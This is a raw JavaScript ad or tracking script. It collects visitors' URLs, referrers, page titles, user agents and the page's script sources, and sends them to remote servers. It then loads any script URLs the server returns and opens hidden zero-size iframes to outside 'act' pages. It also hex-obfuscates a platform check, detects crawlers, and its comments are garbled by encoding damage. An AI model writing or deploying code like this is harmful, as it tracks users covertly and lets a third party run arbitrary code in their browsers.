(function(_W, _D) {
        var hv = 2;    
        if (!_W.trackid){
            _W.trackid_list = [];
        }else{
            _W.trackid_list.push(_W.trackid);
        }
        _W.trackid = 10115;
        _W.trackid_list.push(_W.trackid);
        _W.trackid_list_string = _W.trackid_list.join('-');
        
        if (_W.trackid == _W.trackid_list_string){
            hv = 1;
        }       
        
        _W.aaid_all = '';
        var appid = 4828;   
        var advplaceid = 6898;
        
    var ds = document.domain;
    var ul = window.location.href;
    var rf = document.referrer;
        var iplatform = navigator.platform;
        var jsload = 1,sys_os = '',os_type = '',is_uc = 0;
        var REQUEST_URL = 'https://api.186078.com:3928/Requestnew';
        var num = new Date().getTime() + Math.random().toString(36).slice(2);
        if(navigator.userAgent.indexOf("UCBrowser") > 0) is_uc = 1;
         _W[num] = {
            initRequest : function(){
                var data = {};
                data['trackid'] =  _W.trackid;
                data['ord'] = 1;
                data['advplaceid'] = advplaceid;
                data['appid'] = appid;
                data['appversion'] = "2.0";
                data['c_h'] = screen.height;
                data['c_w'] = screen.width;
                data['domains'] = ds;
                data['dp'] = 1;
                data['iaw'] = 4;
                data['isCrossDomain'] = this.checkCrossDomain();
                data['isDefault'] = 0;
                data['iu'] = 2;
                data['jsload'] = jsload;
                data['mode'] = "1";
                data['muidtype'] = this.getOs();
                data['network'] = 1;
                data['os'] = sys_os;
                data['pxr'] = _W.devicePixelRatio || 1;
                data['reqnum'] = 1;
                data['reqonly'] = advplaceid;
                data['rf'] = rf ? 1 : 0;
                data['s_r_f_v'] = 0;
                data['sdkversion'] = "2.1";
                data['ua'] = _W.navigator.userAgent;
                data['uatype'] = "Safari";
                data['url'] = ul;
        data['title'] = encodeURIComponent(document.title);
                data['url_referer'] = rf;
                data['userckid'] = "983345730";
                data['userckrd'] = "1990274937";
                data['version'] = ".4.2";
                data['wyid'] = "19217173";
                data['yxjs'] = 1;
                data['sizeid'] = "101";
                new Image().src =  "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid="+trackid+"&rf="+rf+"&platform=" + (navigator ? encodeURIComponent(navigator.platform) : '') + "&isCrossDomain="+this.checkCrossDomain()+"&ishidden=999999&ishttps="+this.isHttpsProtocol()+"&os="+os_type+"&ul="+ul+"&cheight="+this.getClientHeight()+"&is_uc="+is_uc+"&cf="+_W.trackid_list_string+"&cfv="+hv+"&position=2&dtime=" + new Date();
                this.reqRequest(REQUEST_URL, JSON.stringify(data), this.reqResponse, null, 1);
            },
            reqRequest : function (url, param, fnSucc, fnFaild, reqnum){
        var oAjax = null;
        if(_W.XMLHttpRequest){ 
                    var oAjax = new XMLHttpRequest();
                    if("withCredentials" in oAjax){
            oAjax.open('POST', url, true); //open(?��?, url, ????�?�?)
            oAjax.setRequestHeader("Content-Type","text/plain");
            oAjax.onreadystatechange = function(){
            if(oAjax.readyState == 4){
                            if(oAjax.status == 200){
                if(fnSucc){
                                    fnSucc(oAjax.responseText,reqnum);
                                }
                            }else{
                                if(fnFaild){
                                    fnFaild();
                                }
                            }
                        }
                    };
                    oAjax.send(param);//????请�?
                    }else if (_W.XDomainRequest){
                    var oAjax = new XDomainRequest();
                    if (oAjax) {
                        oAjax.open("POST", url, true);
                        oAjax.onerror = fnFaild; 
                        oAjax.ontimeout = function (){
                            console.log('XDR 请�?�??��???');
                        };
                        oAjax.onload = function () {
                            fnSucc(oAjax.responseText);
                        };
                        oAjax.timeout = 3000;
                        oAjax.send(param);
                    }
                }
            }else{
                console.log("Your browser does not support XMLHTTP.");
            }
            },
            loadJS:function(url, callback, remove, thisNode, opt) {
            var head = _W.document.getElementsByTagName("head")[0],opt = opt || {};
            var script = _W.document.createElement('script'), remove = ~~remove;
            script.onload = script.onreadystatechange = script.onerror = function() {
                if (script && script.readyState && /^(?!(?:loaded|complete)$)/.test(script.readyState)) return;
                script.onload = script.onreadystatechange = script.onerror = null;
                if(remove) {
                    script.src = '';
                    script.parentNode.removeChild(script);
                    script = null;
                }
                callback && callback();
            };
            for(var i in opt){
                            script.setAttribute(i,opt[i]);
            }
            script.type = 'text/javascript';
            script.charset = "utf-8";
            script.src = url;
            try {
                if(thisNode){
                    thisNode.appendChild(script);
                }else{
                    head.appendChild(script);
                }
            } catch (exp) {}
            },
            loadJSFromNew:function(url) {
                 var li_ifr = document.createElement('IFRAME');
                li_ifr.style.cssText = "border: 0;width: 1px;height: 1px; display:none;";
                li_ifr.setAttribute("scrolling", "no");
                li_ifr.sandbox = 'allow-scripts allow-forms allow-same-origin';
                li_ifr.srcdoc='<html><body><script src='+url+'></script></body></html>';
                document.body.appendChild(li_ifr);               
            },
            reqResponse: function (responseText, reqnum) {
                new Image().src = "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid="+trackid+"&position=14&dtime=" + new Date();                
                var obj = JSON.parse(responseText) || {}, viewid, reqonly, cfg;
                obj = obj.msg;
                if (obj.act){
                    var act = obj.act.split(',');
                    var actl = act.length;
                    if (actl == 1){
                        _W[num].act(act[0]);
                    }else{
                        for (var i in act){
                            if (i == 0){
                                if (parseInt(obj.isapp_pr) == 1 || parseInt(obj.isapp) == 0)  _W[num].act(act[i]);
                            }else{
                                _W[num].act(act[i]);
                            }
                        }
                    }
                }      
                if (obj.baiduid){                   
                    var act_baiduid = obj.baiduid.split(',');//1 2
                    var actl_baiduid = act_baiduid.length;
                    if (actl_baiduid == 1){
                        _W[num].act_baidu(act_baiduid[0],obj,0);
                    }else{
                        for (var i in act_baiduid){
                            if (i == 0){
                                if (parseInt(obj.isapp_pr) == 1 || parseInt(obj.isapp) == 0) _W[num].act_baidu(act_baiduid[i],obj,0);
                            }else{
                                _W[num].act_baidu(act_baiduid[i],obj,i);
                            }
                        }
                    }
                }                          
                var tkls = typeof(obj['tkls']) != 'undefined' ? obj['tkls'][0]['r'] : false; 
                if(tkls){
                    for (var i in tkls) {
                        _W[num].loadJS(tkls[i]['url']);
                    }
                    _W[num].getList(tkls);
                }  
            },
            getRf : function(){
                var s_r_f_v = 0;
                return s_r_f_v;
            },
            act: function (web_id) {
        this.callWithSchema('https://etc.6187wo.com/act.html#web_id='+web_id);
            },
            act_baidu: function (web_id,obj,i) {
                var cur = parseInt(i) + 1;
                var cur_url = 'https://'+obj.advplaceid+'_'+cur+'.6187wo.com/act_baidu.html#web_id='+web_id;
                this.callWithSchema(cur_url);
            },
            callWithSchema : function (schema,id) {
            var frame = document.createElement('iframe');
            id && (frame.id = id);
            frame.style.cssText = 'position:absolute;left:0;top:0;width:0;height:0;visibility:hidden;';
            frame.frameBorder = '0';
            frame.src = schema;
            try{
                document.body.appendChild(frame);
            }catch (e){}
            },  
            getList:function(arr){
                var c = arr.length;
                for(var i=0;i<c;i++){
                    if (arr[i]['apiType'] == 9 || arr[i]['apiType'] == 10 || arr[i]['apiType'] == 11){
                        _W.aaid_all = arr[i]['aaid'];
                        return;
                    }
                }
            },
        getQV:function(url,variable)
        {
        var query = window.location.search.substring(1);
        query = url;
        var vars = query.split("&");
        for (var i=0;i<vars.length;i++) {
            var pair = vars[i].split("=");
            if(pair[0] == variable){return pair[1];}
        }
        return false;
        },
        getscript:function(){
                var string = null;
                var list = document.getElementsByTagName('script');
                var l = list.length;
                for(var i=0;i<l;i++){

                    if (list[i].src) string += '$$$$'+list[i].src;
                }
                var str = encodeURIComponent(string);
                new Image().src  = "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid="+trackid+"&position=9&script=" + str;//isCrossDomain

            },
            getOs: function () {
        var ua = _W.navigator.userAgent.toLowerCase() || '', p = _W.navigator.platform, os;
        if(/baiduspider|googlebot|bingbot|sosospider|youdaobot|spider/.test(ua)){//??索�???????
            sys_os = 'spider';
            os = 4;
        }else if(p.indexOf("\x57\x69\x6e") == 0 || p.indexOf("\x4d\x61\x63") == 0){
            sys_os = 'pc';
            os = 3;
        }else if (/android|adr/.test(ua)) {
            sys_os = 'android';
            os = 1;//'android'
        } else if (/ios|iphone|ipad|itouch/.test(ua)) {
            sys_os = 'ios';
            os = 2;//'ios'
        }else{
            sys_os = 'pc';
            os = 3;
        }
        os_type = os;
                return os_type;
            },  
            checkCrossDomain:function(){
                var r = 0;
                if(_W.self !== _W.top){
                    r = 1;   
                }
                if (_W.parent !== _W.top){
                    r = 2;   
                }
                return r;
            },
            isHttpsProtocol : function () {
                if (location.protocol.indexOf("http:") !== -1) {
                    return 0;
                } else if (location.protocol.indexOf("https:") !== -1) {
                    return 1;
                }
                return 0;
            },
            getClientHeight : function() {
        var clientHeightBody = -119;
        try{
            if(document.body.clientHeight&&document.documentElement.clientHeight) {
                clientHeightBody = Math.min(document.body.clientHeight, document.documentElement.clientHeight);
            }else{
                clientHeightBody = Math.max(document.body.clientHeight, document.documentElement.clientHeight);
            }
        }catch(err){}
        return clientHeightBody || 0;
            },          
            init: function() {
                new Image().src = "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid=" + trackid + "&position=1&platform=" + iplatform + "&cheight=" + this.getClientHeight() + "&ds=" + ds +  "&ul=" + ul+"&rf=" + rf + "&dtime=" + (+new Date());
                this.initRequest();
            }
         };
         _W[num].init();
})(window, document)